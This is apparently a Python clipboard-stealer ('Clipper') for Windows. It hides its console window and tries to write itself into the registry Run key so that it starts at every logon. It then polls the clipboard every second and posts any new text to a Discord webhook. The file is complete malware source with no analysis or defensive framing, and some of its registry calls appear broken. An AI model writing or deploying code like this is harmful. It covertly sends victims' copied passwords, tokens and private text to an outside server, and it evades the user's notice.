import win32clipboard
import time
import requests
import os
import ctypes

webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
last_clipboard_data = None

def add_to_startup(program_name, program_path):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    full_key_path = f"HKEY_CURRENT_USER\\{key_path}"
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            raise PermissionError("Administrator rights are required to modify the registry.")

        ctypes.windll.winreg.SetValueEx(ctypes.c_void_p(0x80000001), program_name, 0, 1, program_path, len(program_path))

        return True
    except Exception as e:
        return str(e)

def hide_window():
    window = ctypes.windll.kernel32.GetConsoleWindow()
    if window:
        ctypes.windll.user32.ShowWindow(window, 0)
        ctypes.windll.kernel32.CloseHandle(window)


if __name__ == "__main__":
    hide_window()
    startup_result = add_to_startup("Clipper", os.path.abspath(__file__))

    if startup_result is True:
        print(f"Created persistence")
    else:
        print(f"Failed to add to startup: {startup_result}")
    
    while True:
        win32clipboard.OpenClipboard()

        try:
            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        except TypeError:
            clipboard_data = None

        win32clipboard.CloseClipboard()

        if clipboard_data and clipboard_data != last_clipboard_data:
            clipboard_text = clipboard_data.decode("utf-8")

            payload = {"content": clipboard_text}

            response = requests.post(webhook_url, json=payload)

            if response.status_code == 204:
                print("Clipboard data sent to Discord successfully")
            else:
                print("Failed to send clipboard data to Discord")

            last_clipboard_data = clipboard_data

        time.sleep(1)
